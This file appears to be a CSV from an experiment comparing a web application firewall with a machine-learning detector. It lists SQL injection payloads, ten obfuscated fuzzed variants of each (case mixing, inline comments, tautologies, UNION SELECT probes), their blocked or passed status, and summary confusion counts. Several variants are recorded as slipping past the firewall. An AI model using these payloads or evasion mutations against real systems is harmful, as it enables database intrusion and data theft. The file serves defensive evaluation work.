Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5,Fuzzed Payload 6,Fuzzed Timestamp 6,WAF Status 6,ML Status 6,Combined Result 6,Fuzzed Payload 7,Fuzzed Timestamp 7,WAF Status 7,ML Status 7,Combined Result 7,Fuzzed Payload 8,Fuzzed Timestamp 8,WAF Status 8,ML Status 8,Combined Result 8,Fuzzed Payload 9,Fuzzed Timestamp 9,WAF Status 9,ML Status 9,Combined Result 9,Fuzzed Payload 10,Fuzzed Timestamp 10,WAF Status 10,ML Status 10,Combined Result 10
(SElECt (seLeCt (selEcT '&+>'!='&+>v')))'Cg",2025-10-25T14:11:30.322624,403,403,both_correct," SeLeCt * fRom users whERe id   LIKe   ''-' LIKE '-'<> AND (SELECT  AND (SELECT 0x1)) IN ( OR 0xe4e LIKE  AND	0x2a0=(SELECT 0x1), OR 'P}Z'	NOT LIKE 'P}ZP',0x24aa)' %!<@ union SeLecT 0x1,version  (    )  
--
(sELecT (SELECT (seLeCt '&+>'<>'&+>v')))'Cg",2025-10-25T14:11:49.546458,403,403,both_correct
24,2025-10-25T14:12:08.293948," select * from users where id  =  1 or ""%["" or 1  =  1 -- 1",403,403,403,both_correct," SElEct * From users WhEre id  = /**/'P'!='PG' OR
""%["" Or 0x1   lIkE    AND 1 -- 1",2025-10-25T14:12:26.183189,403,403,both_correct," sELECt * FROm users wheRe id  =  'P' NOT LIKE 'PG' oR	""%["" or 0x1   LIkE    AND 'o' NOT LIKE 'oq' -- (SELECT  OR 0)",2025-10-25T14:12:45.916982,403,403,both_correct," SElECt * froM users wHeRE id  =  'P' not like 'PG' or	""%["" Or 0x1   Like /**/  aND 'o' NOT LIKE 'oq' -- (SELECT	 OR (SELECT 2866 IN (2865, OR 0,2867)))",2025-10-25T14:13:04.470641,403,403,both_correct," SelEct	* frOm users WheRe id   LIKE   'P' not like 'PG' OR	""%["" oR 0x1   like    anD 'o' NOT LIKE 'oq' -- (SELECT	 OR (SELECT  AND 1 IN (2865, OR 0x0,3054<>3055)))]?",2025-10-25T14:13:23.158628,403,403,both_correct," selECT	* FroM users WHEre id   likE   'P' not like 'PG' OR	""%["" or 0x1   liKE    And 'o' not like 'oq' -- (SELECT	 OR (SELECT 	AND 0x1 IN ('k'/**/NOT LIKE 'kb', OR 0x0,3054<> AND 1)))]?",2025-10-25T14:13:42.330948,403,403,both_correct," seLEct	* From users WheRe id   LIke   'P' not like 'PG' oR	""%["" oR 0x1   likE    ANd 'o' not like 'oq' -- (SELECT		OR (SELECT 	AND 0x1 IN ('k'/*r{**/NOT LIKE/**/'kb', OR 0x0,1588 LIKE (SELECT 1588)<> AND  AND 1)))]?",2025-10-25T14:14:01.263557,403,403,both_correct," selECt	* fROm users wherE id   lIKe   'P' not like 'PG' ||	""%["" Or 0x1	  like    AnD 'o' not like 'oq' -- (SELECT		OR (SELECT 	AND 0x1 IN ('k'/*r{**/NOT LIKE 'kb', OR 0x0,(SELECT 8974<>8975) LIKE (SELECT  AND 1)<> AND  AND 1)))]?wb",2025-10-25T14:14:20.071906,403,403,both_correct," sEleCt	* froM users wHERE id  /**/LiKE   'P' not like 'PG'  OR 	""%["" OR 0x1	  LIke    And 'o' not like 'oq' -- (SELECT		OR (SELECT 	AND	0x1 IN ('k'/*r{**/NOT LIKE 'kb', OR 0x0,(SELECT 8974<> AND 1<>3835) LIKE (SELECT  AND 1)<> AND  AND (SELECT 1))))]?wbr",2025-10-25T14:14:38.491901,403,403,both_correct," sELECT	* froM users wherE id   likE   'P' not like 'PG'  || 	""%["" oR 0x1	  LiKE    aND 'o' not like 'oq' -- (SELECT	
OR (SELECT 	AND	0x1 IN ('k'/*r{**/NOT LIKE 'kb', OR 0x0,(SELECT 'P'<>'PJ'<> AND 1<>(SELECT  OR 0)) LIKE (SELECT  AND 1)<> AND  AND (SELECT 1))))]?wbr,",2025-10-25T14:14:57.766402,403,403,both_correct," seLEcT	* fROM users WHerE id   liKe   'P'/**/not like 'PG'  || 	""%["" or 0x1	  LIKE    And 'o' not like 'oq' -- (SELECT 
Or (seLeCT 	anD	0x1 In ('k'/*r{**/NOT LIKE 'kb', OR 0x0,(seLeCT 'P'<>'PJ'<> AND 0x1<>(seLeCt  oR  and 1)) lIke (SeleCt  And 'ff'!='ff%')<> aND  And (seleCt 1))))]?wbr,",2025-10-25T14:15:16.199259,403,403,both_correct
25,2025-10-25T14:15:34.768387,"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype   =   'u' --",403,403,403,both_correct," && 1 union/**/all seLECt 1,0x2,8868=8868,4,5,6,name fRom sysobjects
WhERe xtype   =   'u' --",2025-10-25T14:15:52.946738,403,403,both_correct," && (SELECT 1) union all seLECt 1,0x2,8868=8997 not like  OR 0,4,5,6,name frOM sysobjects	wheRe xtype   =   'u' --",2025-10-25T14:16:12.944999,403,403,both_correct," && (SEleCT  && 1) union all SElecT 1,0x2,0x22a4=8997 not like  Or 0,2321=2321,5,6,name fROM sysobjects WHERE xtype  /*[4 */=   'u' --",2025-10-25T14:16:31.773980,403,403,both_correct," && (sELEct  && 1) union all
SElEcT (SELECT 1),0x2,0x22a4=2607 NOT LIKE (SELECT 1) not like  or 0,2321=2321,5,6,name frOM sysobjects/**/wHeRe xtype  /*w`u*/ LIKE    'u' --",2025-10-25T14:16:50.654106,403,403,both_correct," && (sEleCt   AND   OR 0) union all
sELect (sELEcT 1),0x2,0x22a4=2607 NOT LIKE (sELECt 1) not like  or 0,0x911='X'!='X?',5,6,name from
sysobjects WHERE xtype  /*))F`*/ LiKe    'u' --",2025-10-25T14:17:11.471336,403,403,both_correct,"  AND  (SELEcT   AND/**/  OR 0) union all
seLEct (SEleCt 1),0x2,0x22a4=2607 NOT LIKE (SELeCt 1) not like  or 0,0x911='X'!='X?',1039<>0x410,	OR 0,name fROm
sysobjects where xtype  /*))F`*/ LikE    'u' --",2025-10-25T14:17:30.514067,403,403,both_correct,"  aND  (SELecT   and/* ivF7*/  oR/**/(SELECT ','=',')) union all
sELECt (selECt 1),0x2,0x22a4=2607 not like (SeLeCt (SELECT 1)) not like  Or 0,0x911='X'!='X?',1039<>0x410,	or 0,name frOM
sysobjects whERe xtype  /*))F`*/ like    'u' --",2025-10-25T14:17:49.394564,403,403,both_correct,"  aNd  (sELECT   And/* ivF7*/  or/**/(seLeCT ','=',')) union all
SeLeCT (SelECT 1),0x2,0x22a4=2607 not like (SElect (SElECt (SElEcT 1))) not like  oR 'l' LiKE 'l',0x911 like 'X'!='X?',1039<>0x410,	oR  And 1,name from sysobjects whERE xtype  /*))F`*/ LIKE    'u'/**/--",2025-10-25T14:18:07.922300,403,403,both_correct,"/**/ and  (SeleCt   AND/* ivF7*/  Or/*#F[:*/(SeLECT ','=',')) union all
seLeCt (SElEct 1),0x2,0x22a4 LIKE 2607 not like (sELEcT (seLeCT (SeLeCT  OR 0))) not like  or 'l' lIke 'l',0x911 LIke 'X'!='X?',1039<>0x410,	Or  And (SELECT ';c2=D' LIKE ';c2=D'),name From sysobjects wHeRE xtype  /*))F`*/	LiKE    'u'/**/--",2025-10-25T14:18:26.596193,403,403,both_correct,"/**/ aNd /**/(SeLEcT   and/* ivF7*/  OR/*#F[:*/(seleCT ','=',')) union all
SeLeCt (sELECt 1),0x2,0x22a4 liKE  OR 0 not like (SElecT (select (SeleCT  Or '$k'<>'$k}')))	not like  OR 'l' LiKE 'l',0x911 LIKe 'X'!='X?',0x40f!=0x410,	OR  AND (selEcT ';c2=D' liKE ';c2=D'),name fRoM sysobjects where xtype  /*))F`*/	LiKe    'u'/**/--q",2025-10-25T14:18:44.857546,403,403,both_correct
26,2025-10-25T14:19:03.232751," select * from users where id  =  1 union select .1$_,version  (    )   -- 1",403,403,200,waf_correct_ml_incorrect," sELEcT * FRoM users WheRe id   LIKE    oR 0 union SELEct .(SeLECt 's!ET' NOT LIKE 's!ETG')$_,version  (  	 )/*:*/  -- 1",2025-10-25T14:19:21.274150,403,403,both_correct," SeLECt * fROm users WHerE id   lIke    OR (SELECT  AND 1) union sEleCT .(SElECT 's!ET'/**/not like 's!ETG')$_,version  (    )/*:*/  -- 296=296Jy",2025-10-25T14:19:40.673715,403,403,both_correct," sElecT * From/**/users WheRe id   lIKE    Or (SeLeCt  anD (select (SELECT 1))) union seLEct	.(sELeCT 's!ET'/*Rx5*/not like 's!ETG')$_,version  (    )/**/  -- 412 LIKE 412=296Jy",2025-10-25T14:19:59.246630,403,403,both_correct," SELecT * frOM/* AND 9862<>9863({*>*/users WhERe id   like    or (sElEct  ANd (selEcT (SELect 0x1))) union SelECt	.(SEleCt 's!ET'/*Rx5*/not like 's!ETG')$_,version  (
   )   -- 412 LIKE 412=296Jy",2025-10-25T14:20:17.620193,403,403,both_correct," SelECt * FroM/* AND 0x2686<>9863({*>*/users WHERE id   lIKE    Or (selECT  aND (selEcT (sELect 0x1))) union SELeCT	.(sELECT 's!ET'/**/not like 's!ETG')$_,version  (    )   -- 412 LIKE/**/6041 LIKE  AND 1=296Jys",2025-10-25T14:20:36.341090,403,403,both_correct," sELEct * fRom/* AND 0x2686<>9863({*>*/users whERE id   lIke    or/**/(seLect  AnD (Select (SELect 0x1))) union seLEcT .(SElect 's!ET'/**/not like 's!ETG')$_,version  (    )   -- (SELECT 7132 LIKE 7132) LIKE/*/I*/6041 LIKE  AND (SELECT 1)=296Jys",2025-10-25T14:20:54.288632,403,403,both_correct," SELecT
* fRom/* AND 0x2686<>9863({*>*/users wHERe id /**/ LiKE    ||/*0*/(seLECt  aND (sELeCT (seleCT 0x1))) union SElEcT .(seLECT 's!ET'/**/not like 's!ETG')$_,version  (    )   -- (SELECT 7132 LIKE 7132) LIKE/*/I*/8685 LIKE (SELECT 1) LIKE  AND (SELECT 0x1)=296Jys",2025-10-25T14:21:12.475995,403,403,both_correct," SeLecT
* frOM/* AND 0x2686<>9863({*>*/users WhERE id /**/ lIKE	   ||/**/(SElECt  and (seLeCT (SElEcT 0x1))) union SELeCt .(seLECt 's!ET' not like 's!ETG')$_,version  (    )   -- (SELECT (SELECT 1) LIKE 0x1bdc) LIKE/*/I*/8685 LIKE (SELECT 1) LIKE  AND (SELECT 0x1)=296Jys'v",2025-10-25T14:21:30.930725,403,403,both_correct," sELect
* FROM/* AND 0x2686<>9863({*>*/users whERE id /**/ LIke
   ||/**/(sELEcT  AnD (sELEct (sELECt 0x1))) union seLeCt .(SELeCT 's!ET' not like 's!ETG')$_,version  (    )   -- (SELECT (SELECT 1) LIKE 0x1bdc)/**/LIKE/*/I*/ AND 1 LIKE 3030 LIKE (SELECT 0x1) LIKE  AND (SELECT 0x1)=296Jys'v;",2025-10-25T14:21:52.007260,403,403,both_correct," SEleCt
* FROM/* AND 0x2686<> AND 1({*>*/users whEre id /**/ liKe
   ||/**/(selecT  anD (SEleCt (SeleCT 0x1))) union sELEcT/**/.(SelecT 's!ET' not like 's!ETG')$_,version  (   
)   -- (SELECT (SELECT '$5x'='$5x') LIKE 0x1bdc)/**/LIKE/*/I*/ AND 0x1 LIKE 3030 LIKE (SELECT 0x1) LIKE  AND (SELECT 0x1)=296Jys'v;Bz",2025-10-25T14:22:09.966276,403,403,both_correct
27,2025-10-25T14:22:27.762772,select * from users where id  =  1 +$+ or 1  =  1 -- 1,403,403,403,both_correct,"sELEcT * fROm users WhErE id	  like   (seLECt  oR 0) +$+ oR 1 /**/=  ''*Q'!=''*Q\' -- 1d",2025-10-25T14:22:45.803639,403,403,both_correct,"SeLeCT * From users wHeRE id	  LIKE   (SeLeCt	 or  OR 0!=(SELECT 3834)) +$+ or/**/1 /**/=  ''*Q'!=''*Q\' -- 1dn",2025-10-25T14:23:04.803863,403,403,both_correct,"sELECt * FroM users WHerE id	  like   (seLect
 or  Or  aNd 1!=(selEcT 0xefa)) +$+ Or/**/'N<^'='N<^'   LikE   ''*Q'!=''*Q\' -- 1dnl",2025-10-25T14:23:22.961683,403,403,both_correct,"SelEct * FroM users WHerE id   lIkE   (SELect
 Or  or  ANd  Or 'W	[*' LIKE 'W	[*' not like (SeLeCT 0xefa)) +$+ oR/*%*/'N<^'='N<^'   lIke/**/  ''*Q'!=''*Q\' -- 1dnl",2025-10-25T14:23:41.986944,403,403,both_correct,"SelecT * from users wHERE id  /**/lIKE   (SELECT	 or  oR  And  or 'W	[*' lIkE 'W	[*' not like (sELecT 0xefa)) +$+ Or/**/'N<^' like 'N<^'   lIKe/**/  ''*Q'!=''*Q\' -- 1dnlZ(",2025-10-25T14:24:00.267139,403,403,both_correct,"SELECT * FROM users wHERe id 
/**/LIke   (SelecT	 OR  OR  And  Or 'W	[*' Like 'W	[*' not like/**/(SeleCT 0xefa)) +$+ or/**/'N<^' liKE 'N<^'   Like/**/  ''*Q'!=''*Q\' -- 1dnlZ(",2025-10-25T14:24:18.651049,403,403,both_correct,"sELecT * from users whErE id 
/**/like   (SElect	 Or  ||  AnD /**/oR 'W	[*' LiKe 'W	[*' not like/**/(SElEct 0xefa)) +$+ or/*(SELECT 0x1)>A9F*/'N<^' liKe 'N<^'   LiKE/**/  ''*Q'!=''*Q\' --	1dnlZ(",2025-10-25T14:24:36.605447,403,403,both_correct,"sElECt
* frOm users/**/WheRe id 
/**/like   (sELEcT	 oR  ||  aNd /**/oR 'W	[*' lIkE 'W	[*' not like/**/(selEct 0xefa)) +$+ OR/*(SELECT 0x1)>A9F*/'N<^' liKe 'N<^'   LikE/**/  ''*Q'!=''*Q\' --	1dnlZ(",2025-10-25T14:24:56.616222,403,403,both_correct,"SELecT
* frOM users/**/WHERE id 
/**/like   (SelEcT	 or  ||  And  OR 'W [*' LIKe 'W	[*' not like/**/(sElEct 0xefa)) +$+ Or/*(SELECT 0x1)>A9F*/'N<^' lIKE 'N<^'   liKe/**/  ''*Q'!=''*Q\' --	1dnlZ(",2025-10-25T14:25:14.623135,403,403,both_correct,"sELeCT
* FROm users/**/whEre id 
/**/LiKE   (sELect	 OR   or   aNd  OR 'W [*' LikE 'W	[*' not like/**/(sELECT 0xefa)) +$+ OR/*(SELECT 0x1)>A9F*/'N<^' LIkE 'N<^'   lIkE/**/  ''*Q'!=''*Q\'/**/--
1dnlZ(",2025-10-25T14:25:32.420748,403,403,both_correct
28,2025-10-25T14:25:50.484333,select * from users where id  =  1   or 1  =  1 -- 1,403,403,403,both_correct,"sElEcT *
fROM users WHErE id   LIKE   0x1   or 1/**/ =   aND 'C' LIKE 'C' -- 1",2025-10-25T14:26:08.127534,403,403,both_correct,"SeLECT	*
FrOM users WHERe id   liKE   0x1   or  AND ' '!=' Z'   LIKE    aNd 'C' Like 'C' -- 1S",2025-10-25T14:26:27.953396,403,403,both_correct,"SeLect *
froM users WHERE id   lIKe   0x1   ||  AND ' '!=' Z'   likE   /*[*/AnD  OR 0<>0xd35 -- 1S",2025-10-25T14:26:46.982371,403,403,both_correct,"sElEct *	FrOm users wHerE id   LIKE   0x1   ||  And ' '!=' Z'   LikE    aND  oR  OR 0x0 like 5864<>0xd35 -- 1S+",2025-10-25T14:27:05.628630,403,403,both_correct,"sEleCt *	fROM users/*yg*/whEre id   LiKe   0x1	   or   and ' '!=' Z'   LikE    AnD  Or  or 0x0 LIKE  AND 'cL6'!='cL6g'<>0xd35 -- 1S+",2025-10-25T14:27:24.043255,403,403,both_correct,"seleCt *	FRom users/**/WHeRE id   LIke   0x1	   OR   AnD ' '!=' Z'  
like    and  Or  or 0x0 lIke  anD 'cL6'!='cL6g'<>0xd35/*{*/-- 1S+",2025-10-25T14:27:41.956200,403,403,both_correct,"SeLEcT *
frOm users/**/WHeRe id   LiKE   0x1	   oR   ANd ' '!=' Z'  
likE /**/  AnD  oR  OR 0x0 Like  and 'cL6' not like 'cL6g'<>0xd35/*-_2*/-- 1S+",2025-10-25T14:28:00.625583,403,403,both_correct,"SELEct *
FRom users/**/wherE id   LiKe   0x1
   Or   And ' '!=' Z'  
like    AnD  oR  OR 0x0 LiKE  aND 'cL6' not like 'cL6g'!=0xd35/*-_2*/-- 1S+Ta",2025-10-25T14:28:19.962487,403,403,both_correct,"seLect *
frOM users wHerE id   liKE   0x1
   OR   aND ' '!=' Z'  
Like    anD  or	 or 0x0 like  aNd 'cL6' not like 'cL6g'!=0xd35/*-_2*/-- 1S+Tag",2025-10-25T14:28:38.935398,403,403,both_correct,"SElecT *
FrOm users WHeRe id   lIKE   0x1
   OR   AND ' ' not like ' Z'  
liKE    ANd  oR  Or 0x0 LIKe  And 'cL6' not like/**/'cL6g'!=0xd35/**/-- 1S+Tagj",2025-10-25T14:28:57.161612,403,403,both_correct
29,2025-10-25T14:29:15.667445,or 1  =  1--,403,200,200,both_incorrect,"or (SeLECt  OR/**/0) not like 7464  = 
1--",2025-10-25T14:29:33.098833,200,403,waf_incorrect_ml_correct,"oR (sELect  oR/**/0x0) not like  oR/**/0  = 	2887!=2888--",2025-10-25T14:29:52.393962,200,403,waf_incorrect_ml_correct,"Or (selecT  oR/**/0x0) not like 	Or 'uP'<>'uP~'  = 	(seleCT 1) not like 0xb48--",2025-10-25T14:30:11.170974,200,403,waf_incorrect_ml_correct,"OR (SeLecT  Or 0x0) not like 	oR 'uP'<>'uP~'   like  	(seLecT	 anD (SeLECt 2221 LIKE 2221)) not like 0xb48--",2025-10-25T14:30:29.742543,200,403,waf_incorrect_ml_correct,"Or (SeLEcT  Or 0x0) not like 	oR 'uP' NOT LIKE 'uP~'   LIkE  	(sElECt	 aND (SElect 0x8ad liKE (SELECT 1)!=3328))/**/not like
0xb48--",2025-10-25T14:30:48.105829,200,403,waf_incorrect_ml_correct,"OR (sElecT  Or 0x0) not like  oR 'uP' NOT LIKE 'uP~'   lIke  	(SeLeCT	 AND (sELECT 0x8ad lIKe/**/(seLecT  AND 'iK?'='iK?') NOT LIKE 0xd00))/**/not like
0xb48--",2025-10-25T14:31:06.545900,200,403,waf_incorrect_ml_correct,"OR (sELeCT  OR 0x0) not like /**/Or 'uP' not like 'uP~'   LIke  	(SELEcT	 ANd (selEct 0x8ad LikE/**/(SElect  and 'iK?'='iK?') NOT LIKE 0xd00))/**/not like 0xb48--",2025-10-25T14:31:24.399515,200,403,waf_incorrect_ml_correct,"OR (SeLEct  or 0x0) not like /**/or 'uP' not like 'uP~'   lIKE  	(seleCt
 aND (sEleCt 0x8ad liKE/*RDn*/(SelEct  anD 'iK?'='iK?') not like 0xd00)) not like 0xb48--",2025-10-25T14:31:43.102088,200,403,waf_incorrect_ml_correct,"or (seLEcT  or 0x0)/**/not like /**/Or 'uP' not like 'uP~'   lIKE  	(SElecT
 AND (sELecT 0x8ad Like/*RDn*/(SelEct	 AnD 'iK?'='iK?') not like 0xd00)) not like 0xb48--",2025-10-25T14:32:01.944707,200,403,waf_incorrect_ml_correct,"oR (SElEcT  or 0x0)/**/not like /**/OR 'uP' not like 'uP~'   lIkE  	(sElect  anD (sELeCt 0x8ad LIKe (SelecT	 AnD 'iK?' LIkE 'iK?') not like 0xd00)) not like 0xb48--",2025-10-25T14:32:19.628225,200,403,waf_incorrect_ml_correct
30,2025-10-25T14:32:37.939330," select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'",403,403,403,both_correct," seLEcT * FROM users wHeRE id /*c*/ likE   ''	OQ'!='	OQF'' union	SELect   (  \.  )  ,@@VERSION -- (SELECT  AND 1)'",2025-10-25T14:32:55.282469,403,403,both_correct," selecT	* From users WhEre id /*(i*/ lIKE   ''	OQ'!='	OQF'' union	seLeCt/**/  (  \.  )  ,@@VERSION -- (SELECT  AND (SELECT  AND 'r	+'='r	+'))'",2025-10-25T14:33:14.099582,403,403,both_correct," sELEcT	* From users whEre id /*(i*/ Like   ''	OQ'!='	OQF'' union selEct   (  \.  )  ,@@VERSION -- (SELECT  AND (SELECT  AND 'r	+'='r	+'))'",2025-10-25T14:33:32.762914,403,403,both_correct," SELeCT	* frOM users whErE id /*(i*/ lIKe  /**/''	OQ'!='	OQF'' union SeLeCT  	(  \.  )  ,@@VERSION -- (SELECT  AND (SELECT  AND 'r	+'='r	+'))'.A",2025-10-25T14:33:51.149074,403,403,both_correct," SeLEct	* fROM users WHeRe id /*(i*/ LiKe  /**/''
OQ'!='	OQF'' union seLeCt  	(  \.  )  ,@@VERSION -- (SELECT/**/ AND (SELECT  AND 'r	+'='r	+'))'.AQ",2025-10-25T14:34:09.605059,403,403,both_correct," SeleCt	* FroM users wheRE id /*(i*/ lIkE   ''	OQ'!='	OQF'' union sElECt  	(  \.  )  ,@@VERSION -- (SELECT/**/ AND (SELECT  AND 'r	+'='r	+'))'.AQL9",2025-10-25T14:34:27.346167,403,403,both_correct," SeLeCT	* from users WHERe id /*(i*/ LIkE   ''	OQ'!='	OQF'' union SElECT  	(  \.  ) 
,@@VERSION -- (SELECT  AND (SELECT  AND 'r	+'='r	+'))'.AQL9^",2025-10-25T14:34:46.154194,403,403,both_correct," SElEcT	* FrOm users Where id /*(i*/ lIkE   ''	OQ'!='	OQF'' union SELEcT  	(  \.  ) 	,@@VERSION -- (SELECT  AND (SELECT/**/ AND 'r	+'='r	+'))'.AQL9^Fd",2025-10-25T14:35:05.043451,403,403,both_correct," seLeCt	* FrOM users wheRE id /*(i*/ likE   ''	OQ'!='	OQF'' union SELECT  	(  \.  ) 	,@@VERSION --	(SELECT  AND (SELECT  AND 'r	+'='r	+'))'.AQL9^Fd",2025-10-25T14:35:22.827292,403,403,both_correct," seLEct	* fROm users WheRe id /*(i*/ liKe/*p!*/  ''	OQ'!='	OQF'' union SELect   (  \.  ) 	,@@VERSION --	(SELECT  AND (SELECT  AND 'r	+'='r	+'))'.AQL9^Fd",2025-10-25T14:35:40.712250,403,403,both_correct
,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Overall Results,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
WAF TP,289,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
WAF TN,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
WAF FP,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
WAF FN,41,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ML TP,317,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ML TN,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ML FP,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ML FN,13,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Combined Results (2x2 Matrix),,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
,WAF Correct,WAF Incorrect,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ML Correct,280,37,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ML Incorrect,9,4,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
